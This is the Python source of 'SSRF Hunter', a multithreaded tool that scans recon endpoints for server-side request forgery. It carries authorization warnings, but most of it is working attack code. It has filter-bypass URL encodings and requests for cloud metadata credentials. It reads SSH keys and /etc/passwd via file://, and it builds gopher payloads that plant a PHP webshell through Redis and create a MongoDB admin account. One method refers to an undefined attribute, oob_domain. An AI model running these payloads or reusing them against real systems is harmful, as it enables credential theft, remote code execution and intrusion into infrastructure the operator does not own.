#!/usr/bin/env python3
"""
SSRF Hunter — Dedicated SSRF discovery, bypass, and escalation tool.
Methodology adapted from: "The Ultimate Guide to SSRF: Hunting, Bypassing and
Exploiting in Modern Bug Bounty" by Lostsec (Oct 2026).

WARNING: Only run this against targets you own or have explicit written
authorization to test. Unauthorized SSRF testing can violate laws and bug
bounty program policies. The author accepts no liability for misuse.
"""

import argparse
import concurrent.futures
import ipaddress
import json
import os
import re
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import List, Dict, Optional, Set, Tuple
from urllib.parse import (
    urlparse, parse_qs, urlencode, urlunparse, quote, urljoin
)

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---------------------------------------------------------------------------
# Constants & payloads (derived from the article)
# ---------------------------------------------------------------------------

VERSION = "1.0.0"

# Parameters commonly associated with SSRF (from article Phase 1 / Phase 2)
SSRF_PARAM_KEYWORDS = [
    "url", "uri", "link", "src", "source", "target", "dest", "destination",
    "redirect", "redirect_uri", "returnUrl", "return_url", "next", "continue",
    "callback", "callbackUrl", "callback_url", "webhook", "webhookUrl",
    "webhook_url", "endpoint", "file", "file_url", "filepath", "path",
    "img", "img_url", "image", "image_url", "logo", "avatar", "thumbnail",
    "load", "load_url", "fetch", "fetch_url", "import", "import_url",
    "data", "external", "external_url", "external_link", "proxy", "proxy_url",
    "devUrl", "dev_url", "referenceUrl", "reference_url", "open", "background",
    "document", "doc", "template", "render", "template_url", "stylesheet",
    "feed", "rss", "atom", "soap", "wsdl", "config", "config_url",
]

# High-signal SSRF feature keywords in URL paths (article Phase 2)
SSRF_PATH_KEYWORDS = [
    "preview", "proxy", "fetch", "load", "import", "convert", "render",
    "generate", "webhook", "callback", "redirect", "image", "img", "pdf",
    "screenshot", "scraper", "scrape", "metadata", "download", "upload",
    "svg", "xml", "soap", "graphql", "ws", "socket", "rss", "atom",
]

# OOB / DNS rebinding friendly domains from the article
OOB_DOMAINS = [
    "oastify.com", "interact.sh", "burpcollaborator.net",
    "webhook.site", "requestrepo.com",
]

# Loopback / metadata targets used for confirmation & escalation
LOOPBACK_TARGETS = [
    "127.0.0.1", "localhost", "0", "127.1", "127.0.1", "[::]",
    "[0:0:0:0:0:ffff:127.0.0.1]", "0000::1",
]
METADATA_TARGETS = ["169.254.169.254", "100.100.100.200"]

# Internal ports to probe after SSRF confirmation (article Phase 3)
INTERNAL_PORTS = [22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9000, 9200, 11211, 27017]

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class Endpoint:
    url: str
    method: str = "GET"
    params: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    source: str = "endpoints.txt"
    is_ssrf_candidate: bool = False
    matched_param: Optional[str] = None

@dataclass
class Finding:
    endpoint: str
    parameter: str
    payload: str
    technique: str
    status_code: Optional[int]
    response_length: Optional[int]
    response_time_ms: Optional[float]
    evidence: str
    severity: str = "Informational"
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

# ---------------------------------------------------------------------------
# Payload generator (article phases 3, 4, 5)
# ---------------------------------------------------------------------------

class PayloadGenerator:
    """Generates SSRF test payloads organized by technique."""

    def __init__(self, oob_callback: Optional[str] = None,
                 listener_url: Optional[str] = None,
                 redirector_url: Optional[str] = None):
        self.oob_callback = oob_callback or "http://YOUR_OOB_DOMAIN.oast.fun"
        self.listener_url = listener_url or "http://YOUR_LISTENER:8080/test"
        self.redirector_url = redirector_url or "https://YOUR_SERVER.com/ssrf_redirect.php"

    # --- Phase 3: Detection --------------------------------------------------

    def oob_detection_payloads(self, param_value: str) -> List[str]:
        """Out-of-band payloads for blind/semi-blind SSRF."""
        return [
            self.oob_callback,
            self.oob_callback.replace("http://", "https://", 1) if self.oob_callback.startswith("http://") else self.oob_callback.replace("https://", "http://", 1),
        ]

    def in_band_payloads(self) -> List[str]:
        """In-band confirmation payloads (echo back from your server)."""
        return [self.listener_url]

    # --- Phase 4: WAF / Filter / Whitelist bypasses --------------------------

    def ip_bypass_payloads(self, target_ip: str = "127.0.0.1") -> List[str]:
        """Alternative IP representations to bypass string/blacklist filters."""
        # Decimal representations
        try:
            dec = int(ipaddress.IPv4Address(target_ip))
        except Exception:
            dec = 2130706433
        payloads = [
            f"http://{dec}/",
            f"http://{dec + 1}/",
        ]
        # Octal / leading zero
        if target_ip == "127.0.0.1":
            payloads += ["http://0177.0.0.1/", "http://0177.0000.0000.0001/"]
        # Short / incomplete forms
        payloads += [
            f"http://{target_ip.replace('.0.0', '.1')}/",
            f"http://{target_ip.split('.')[0]}.1/",
            "http://0/",
            "http://127.1/",
            "http://127.0.1/",
        ]
        # IPv6 embedding
        payloads += [
            "http://[::]:80/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
            "http://0000::1:80/",
        ]
        # URL encoding
        payloads += [
            "http://127.0.0.1/%61dmin",
            "http://127.0.0.1/%2561dmin",
        ]
        # Parser confusion (@, #, backslash, double @)
        payloads += [
            f"http://example.com@{target_ip}/",
            f"http://{target_ip}%23@example.com/",
            f"http://{target_ip}%5cexample.com/",
            f"http://127.1.1.1:80%5c%40{target_ip}:80/",
            f"http://{target_ip}:80%40example.com/",
        ]
        # PHP filter_var() bypass
        payloads.append("0://evil.com:80;http://target.com:80/")
        # Enclosed alphanumerics
        payloads.append("http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ/")
        return payloads

    def wildcard_dns_payloads(self) -> List[str]:
        """nip.io / localtest.me style loopback hostnames."""
        return [
            "http://127.0.0.1.nip.io/",
            "http://169.254.169.254.nip.io/",
            "http://localtest.me/",
            "http://spoofed.burpcollaborator.net/",
            "http://customer.localhost.company.127.0.0.1.nip.io/",
        ]

    def dns_rebinding_payloads(self) -> List[str]:
        """Hint payloads for DNS rebinding (TOCTOU) testing."""
        return [
            "http://rbndr.us/",            # public rebinding service
            "http://lock.cmpxchg8b.com/",  # rebinder generator
        ]

    def open_redirect_chain_payloads(self, whitelisted_base: str) -> List[str]:
        """Chain a whitelisted open redirect to an internal/metadata endpoint."""
        return [
            f"{whitelisted_base}?redirect_uri={self.redirector_url}",
            f"{whitelisted_base}?next={self.redirector_url}",
            f"{whitelisted_base}?url={self.redirector_url}",
        ]

    def header_injection_payloads(self) -> List[Dict[str, str]]:
        """HTTP headers that may be processed server-side and trigger SSRF."""
        oob = self.oob_domain
        return [
            {"Referer": f"http://{oob}/"},
            {"X-Forwarded-For": f"http://{oob}/"},
            {"X-Forwarded-Host": f"http://{oob}/"},
            {"X-Original-URL": f"http://{oob}/"},
            {"True-Client-IP": f"http://{oob}/"},
            {"Client-IP": f"http://{oob}/"},
        ]

    def alternative_scheme_payloads(self) -> List[str]:
        """gopher / dict / file schemes for RCE and local file read."""
        return [
            "gopher://127.0.0.1:6379/_",
            "dict://127.0.0.1:11211/",
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "file:///root/.ssh/id_rsa",
            "file:///C:/Windows/win.ini",
        ]

    def redis_gopher_webshell_payload(self, webroot: str = "/var/www/html",
                                      filename: str = "shell.php") -> str:
        """Gopherus-style Redis payload that writes a PHP webshell (article Phase 5)."""
        payload = (
            "FLUSHALL\r\n"
            f'SET 1 "\n\n<?php system($_GET[\'cmd\']); ?>\n\n"\r\n'
            f"CONFIG SET dir {webroot}\r\n"
            f"CONFIG SET dbfilename {filename}\r\n"
            "SAVE\r\n"
        )
        encoded = self._gopher_encode(payload)
        return f"gopher://127.0.0.1:6379/_{encoded}"

    def mongodb_gopher_admin_payload(self) -> str:
        """Raw MongoDB wire protocol INSERT to create admin:admin123."""
        raw = (
            "%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00"
            "%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00"
            "percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username"
            "%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02"
            "permission%00%0e%00%00administrator%00%00%00%00"
        )
        return f"gopher://0.0.0.0:27017/_{raw}"

    def svg_ssrf_payload(self, target_url: str) -> str:
        """SVG with xlink:href pointing to an internal/metadata endpoint."""
        return (
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
            f'<image xlink:href="{target_url}" height="200" width="200"/>'
            '</svg>'
        )

    def graphql_ssrf_payload(self, field: str = "sourceUrl",
                             target_url: str = "http://169.254.169.254/latest/meta-data/") -> str:
        """GraphQL mutation with user-supplied URL."""
        return (
            f'mutation {{ importData({field}: "{target_url}") {{ status result }} }}'
        )

    def websocket_proxy_payload(self, target: str = "ws://127.0.0.1:6379") -> str:
        """WebSocket proxying SSRF request line."""
        return f"GET /ws-proxy?target={target} HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"

    def crlf_injection_payload(self, allowed: str = "http://allowed.com",
                               target: str = "169.254.169.254") -> str:
        """CRLF injection to manipulate outgoing Host header."""
        return f"{allowed}%0d%0aHost:%20{target}"

    # --- Phase 5: Cloud metadata & escalation --------------------------------

    def cloud_metadata_payloads(self) -> List[str]:
        """Multi-cloud metadata endpoints (article Phase 5 cheat sheet)."""
        payloads = []
        # AWS IMDSv1
        payloads += [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.170.2/v2/credentials/",  # ECS
        ]
        # GCP
        payloads += [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ]
        # Azure
        payloads += [
            "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
            "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text",
        ]
        # DigitalOcean
        payloads += [
            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.169.254/metadata/v1/user-data",
            "http://169.254.169.254/metadata/v1/hostname",
        ]
        # Alibaba Cloud
        payloads += [
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/user-data",
        ]
        # Oracle / OpenStack / Packet
        payloads += [
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/openstack/2012-08-10/meta_data.json",
            "https://metadata.packet.net/userdata",
        ]
        return payloads

    @staticmethod
    def _gopher_encode(text: str) -> str:
        """URL-encode a raw protocol string for use in a gopher:// URL."""
        return quote(text, safe="")

# ---------------------------------------------------------------------------
# Endpoint parser
# ---------------------------------------------------------------------------

class EndpointParser:
    """Parses recon output (endpoints.txt) into SSRF candidate endpoints."""

    PARAM_RE = re.compile(r"([^?&=]+)=([^&]*)")

    @classmethod
    def from_file(cls, path: str) -> List[Endpoint]:
        endpoints: List[Endpoint] = []
        if not os.path.isfile(path):
            return endpoints
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Accept raw URLs or "METHOD URL" lines
                parts = line.split(None, 1)
                method = "GET"
                url = line
                if len(parts) == 2 and parts[0].upper() in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
                    method, url = parts[0].upper(), parts[1]
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                params = {k: v[0] if v else "" for k, v in qs.items()}
                ep = Endpoint(url=url, method=method, params=params, source=path)
                # Flag SSRF candidates
                for key in params:
                    if key.lower() in SSRF_PARAM_KEYWORDS:
                        ep.is_ssrf_candidate = True
                        ep.matched_param = key
                        break
                if not ep.is_ssrf_candidate:
                    path_lower = parsed.path.lower()
                    if any(k in path_lower for k in SSRF_PATH_KEYWORDS):
                        ep.is_ssrf_candidate = True
                        ep.matched_param = "<path>"
                endpoints.append(ep)
        return endpoints

# ---------------------------------------------------------------------------
# Local HTTP listener (for in-band confirmation)
# ---------------------------------------------------------------------------

class CaptureHandler(BaseHTTPRequestHandler):
    hits: List[dict] = []

    def do_GET(self):
        CaptureHandler.hits.append({
            "path": self.path,
            "headers": dict(self.headers),
            "time": datetime.utcnow().isoformat() + "Z",
        })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"SSRF_CONFIRMED")

    def log_message(self, fmt, *args):
        pass  # silence


class InBandListener:
    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.server: Optional[HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        CaptureHandler.hits.clear()
        self.server = HTTPServer((self.host, self.port), CaptureHandler)
        self.running = True
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        time.sleep(0.5)

    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()

    def got_hit(self) -> bool:
        return len(CaptureHandler.hits) > 0

# ---------------------------------------------------------------------------
# OOB polling (webhook.site / requestrepo)
# ---------------------------------------------------------------------------

class OOBValidator:
    def __init__(self, webhook_url: Optional[str] = None):
        self.webhook_url = webhook_url

    def check_callbacks(self) -> List[dict]:
        if not self.webhook_url:
            return []
        try:
            r = requests.get(self.webhook_url, timeout=10)
            return r.json() if r.headers.get("content-type", "").startswith("application/json") else []
        except Exception:
            return []

# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------

class SSRFHunter:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.generator = PayloadGenerator(
            oob_callback=args.oob_callback,
            listener_url=args.listener_url,
            redirector_url=args.redirector_url,
        )
        self.session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503])
        self.session.mount("http://", HTTPAdapter(max_retries=retry))
        self.session.mount("https://", HTTPAdapter(max_retries=retry))
        self.session.headers.update({"User-Agent": "SSRFHunter/1.0 (authorized security testing)"})
        self.findings: List[Finding] = []
        self.listener: Optional[InBandListener] = None
        self.oob: Optional[OOBValidator] = None
        self._lock = threading.Lock()

    # -- setup ---------------------------------------------------------------

    def start_listener(self):
        if self.args.mode in {"confirm", "inband", "all"}:
            self.listener = InBandListener(port=self.args.listen_port)
            self.listener.start()

    def stop_listener(self):
        if self.listener:
            self.listener.stop()

    def start_oob(self):
        if self.args.mode in {"detect", "blind", "all"}:
            self.oob = OOBValidator(webhook_url=self.args.webhook_url)

    # -- request helpers -----------------------------------------------------

    def _send(self, method: str, url: str, headers: Optional[Dict] = None,
              params: Optional[Dict] = None, data: Optional[str] = None,
              timeout: int = 10) -> Optional[requests.Response]:
        try:
            if method.upper() == "GET":
                return self.session.get(url, params=params, headers=headers,
                                        timeout=timeout, allow_redirects=False)
            if method.upper() == "POST":
                return self.session.post(url, data=data, headers=headers,
                                         timeout=timeout, allow_redirects=False)
        except requests.RequestException:
            return None
        return None

    def _inject_param(self, base_url: str, param: str, value: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query)
        qs[param] = [value]
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, parsed.fragment))

    # -- scanning ------------------------------------------------------------

    def scan_endpoint(self, ep: Endpoint) -> List[Finding]:
        findings: List[Finding] = []

        # Determine parameters to test
        test_params = list(ep.params.keys()) if ep.params else ["url"]

        for param in test_params:
            original_value = ep.params.get(param, "")

            # --- Detection: OOB blind payloads ---
            if self.args.mode in {"detect", "blind", "all"}:
                for payload in self.generator.oob_detection_payloads(original_value):
                    test_url = self._inject_param(ep.url, param, payload)
                    start = time.time()
                    resp = self._send(ep.method, test_url, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    if resp:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=param, payload=payload,
                            technique="OOB Blind Detection", status_code=resp.status_code,
                            response_length=len(resp.content or b""),
                            response_time_ms=round(rt, 2),
                            evidence=f"Sent OOB callback payload to {param}",
                            severity="Low",
                        ))

            # --- Confirmation: In-band ---
            if self.args.mode in {"confirm", "inband", "all"} and self.listener:
                for payload in self.generator.in_band_payloads():
                    test_url = self._inject_param(ep.url, param, payload)
                    start = time.time()
                    resp = self._send(ep.method, test_url, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    hit = self.listener.got_hit()
                    if resp or hit:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=param, payload=payload,
                            technique="In-Band Confirmation",
                            status_code=resp.status_code if resp else None,
                            response_length=len(resp.content or b"") if resp else None,
                            response_time_ms=round(rt, 2),
                            evidence="Listener received callback" if hit else "Response received",
                            severity="High" if hit else "Medium",
                        ))

            # --- Bypass payloads (WAF/filter evasion) ---
            if self.args.mode in {"bypass", "all"}:
                for payload in self.generator.ip_bypass_payloads():
                    test_url = self._inject_param(ep.url, param, payload)
                    start = time.time()
                    resp = self._send(ep.method, test_url, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    if resp:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=param, payload=payload,
                            technique="WAF Bypass (IP representation)",
                            status_code=resp.status_code,
                            response_length=len(resp.content or b""),
                            response_time_ms=round(rt, 2),
                            evidence="Tested alternative IP encoding",
                            severity="Medium",
                        ))

            # --- Wildcard DNS / nip.io ---
            if self.args.mode in {"bypass", "all"}:
                for payload in self.generator.wildcard_dns_payloads():
                    test_url = self._inject_param(ep.url, param, payload)
                    start = time.time()
                    resp = self._send(ep.method, test_url, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    if resp:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=param, payload=payload,
                            technique="Wildcard DNS (nip.io / localtest.me)",
                            status_code=resp.status_code,
                            response_length=len(resp.content or b""),
                            response_time_ms=round(rt, 2),
                            evidence="Tested loopback hostname",
                            severity="Medium",
                        ))

            # --- Cloud metadata escalation ---
            if self.args.mode in {"escalate", "all"}:
                for payload in self.generator.cloud_metadata_payloads():
                    test_url = self._inject_param(ep.url, param, payload)
                    start = time.time()
                    resp = self._send(ep.method, test_url, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    if resp and resp.status_code == 200:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=param, payload=payload,
                            technique="Cloud Metadata Escalation",
                            status_code=resp.status_code,
                            response_length=len(resp.content or b""),
                            response_time_ms=round(rt, 2),
                            evidence="Metadata endpoint returned HTTP 200",
                            severity="Critical",
                        ))

            # --- Header injection ---
            if self.args.mode in {"headers", "all"}:
                for hdr in self.generator.header_injection_payloads():
                    start = time.time()
                    resp = self._send(ep.method, ep.url, headers=hdr, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    if resp:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=list(hdr.keys())[0],
                            payload=str(hdr), technique="HTTP Header Injection",
                            status_code=resp.status_code,
                            response_length=len(resp.content or b""),
                            response_time_ms=round(rt, 2),
                            evidence=f"Injected header {list(hdr.keys())[0]}",
                            severity="Medium",
                        ))

            # --- Alternative schemes (gopher / dict / file) ---
            if self.args.mode in {"escalate", "all"}:
                for payload in self.generator.alternative_scheme_payloads():
                    test_url = self._inject_param(ep.url, param, payload)
                    start = time.time()
                    resp = self._send(ep.method, test_url, timeout=self.args.timeout)
                    rt = (time.time() - start) * 1000
                    if resp:
                        findings.append(Finding(
                            endpoint=ep.url, parameter=param, payload=payload,
                            technique="Alternative URI Scheme",
                            status_code=resp.status_code,
                            response_length=len(resp.content or b""),
                            response_time_ms=round(rt, 2),
                            evidence=f"Tested scheme {payload.split('://')[0]}",
                            severity="High" if payload.startswith("file://") else "Medium",
                        ))

        return findings

    def run(self, endpoints: List[Endpoint]):
        self.start_listener()
        self.start_oob()
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                futures = {executor.submit(self.scan_endpoint, ep): ep for ep in endpoints}
                for future in concurrent.futures.as_completed(futures):
                    try:
                        res = future.result()
                        with self._lock:
                            self.findings.extend(res)
                    except Exception as exc:
                        print(f"[!] Scan error: {exc}", file=sys.stderr)
        finally:
            self.stop_listener()

        # OOB callback poll
        if self.oob:
            callbacks = self.oob.check_callbacks()
            if callbacks:
                print(f"[+] OOB callbacks received: {len(callbacks)}")

# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

class Reporter:
    def __init__(self, output_dir: str = "ssrf_report"):
        os.makedirs(output_dir, exist_ok=True)
        self.output_dir = output_dir

    def write_json(self, findings: List[Finding], targets: List[str]):
        data = {
            "generated": datetime.now(timezone.utc).isoformat(),
            "targets": targets,
            "total_findings": len(findings),
            "findings": [asdict(f) for f in findings],
        }
        path = os.path.join(self.output_dir, "ssrf_findings.json")
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        print(f"[+] JSON report written to {path}")

    def write_markdown(self, findings: List[Finding]):
        lines = [
            "# SSRF Hunter Report",
            f"Generated: {datetime.now(timezone.utc).isoformat()}",
            f"Total findings: {len(findings)}\n",
        ]
        sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Informational": 4}
        sorted_f = sorted(findings, key=lambda x: sev_order.get(x.severity, 9))
        for f in sorted_f:
            lines.append(f"## [{f.severity}] {f.technique}")
            lines.append(f"- **Endpoint:** {f.endpoint}")
            lines.append(f"- **Parameter:** {f.parameter}")
            lines.append(f"- **Payload:** `{f.payload}`")
            lines.append(f"- **Status:** {f.status_code}")
            lines.append(f"- **Response Length:** {f.response_length}")
            lines.append(f"- **Response Time:** {f.response_time_ms} ms")
            lines.append(f"- **Evidence:** {f.evidence}")
            lines.append(f"- **Timestamp:** {f.timestamp}\n")
        path = os.path.join(self.output_dir, "ssrf_report.md")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines))
        print(f"[+] Markdown report written to {path}")

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="SSRF Hunter — discover and escalate SSRF from recon data.",
        epilog="Example: python3 ssrf_hunter.py -f target/endpoints.txt --mode all --oob-domain YOUR.oast.fun --confirm-authorized",
    )
    p.add_argument("-f", "--file", help="Path to endpoints.txt recon file")
    p.add_argument("-d", "--dir", help="Target folder containing endpoints.txt")
    p.add_argument("-m", "--mode", choices=["detect", "confirm", "bypass", "escalate", "headers", "all"],
                   default="all", help="Scan mode (default: all)")
    p.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
    p.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    p.add_argument("--oob-callback", default="http://YOUR_OOB_DOMAIN.oast.fun",
                   help="Full callback URL for OOB blind SSRF payloads (e.g. https://webhook.site/UUID)")
    p.add_argument("--webhook-url", help="Webhook.site / Requestrepo URL to poll for OOB callbacks")
    p.add_argument("--listener-url", default="http://YOUR_LISTENER:8080/test",
                   help="In-band confirmation listener URL")
    p.add_argument("--listen-port", type=int, default=8080,
                   help="Local port for in-band confirmation listener (default: 8080)")
    p.add_argument("--redirector-url", default="https://YOUR_SERVER.com/ssrf_redirect.php",
                   help="Open redirector chain destination (for whitelist bypass testing)")
    p.add_argument("-o", "--output", default="ssrf_report", help="Report output directory")
    p.add_argument("--confirm-authorized", action="store_true",
                   help="REQUIRED: Confirm you have written authorization to test this target")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.confirm_authorized:
        print("=" * 70)
        print("AUTHORIZATION REQUIRED")
        print("=" * 70)
        print("SSRF testing can impact internal infrastructure and cloud metadata.")
        print("Only run this against systems you own or have explicit written")
        print("authorization to test. Re-run with --confirm-authorized to proceed.")
        print("=" * 70)
        sys.exit(1)

    # Resolve input file
    input_file = args.file
    if args.dir and not input_file:
        input_file = os.path.join(args.dir, "endpoints.txt")
    if not input_file or not os.path.isfile(input_file):
        print(f"[!] endpoints.txt not found: {input_file}")
        sys.exit(1)

    print(f"[*] Loading endpoints from: {input_file}")
    endpoints = EndpointParser.from_file(input_file)
    candidates = [e for e in endpoints if e.is_ssrf_candidate]
    print(f"[*] Loaded {len(endpoints)} endpoints, {len(candidates)} SSRF candidates")

    hunter = SSRFHunter(args)
    hunter.run(candidates)

    reporter = Reporter(output_dir=args.output)
    reporter.write_json(hunter.findings, [input_file])
    reporter.write_markdown(hunter.findings)

    # Summary
    crit = [f for f in hunter.findings if f.severity == "Critical"]
    high = [f for f in hunter.findings if f.severity == "High"]
    print(f"\n[*] Scan complete. Findings: {len(hunter.findings)} total | "
          f"{len(crit)} Critical | {len(high)} High")
    print(f"[*] Reports saved to: {args.output}/")


if __name__ == "__main__":
    main()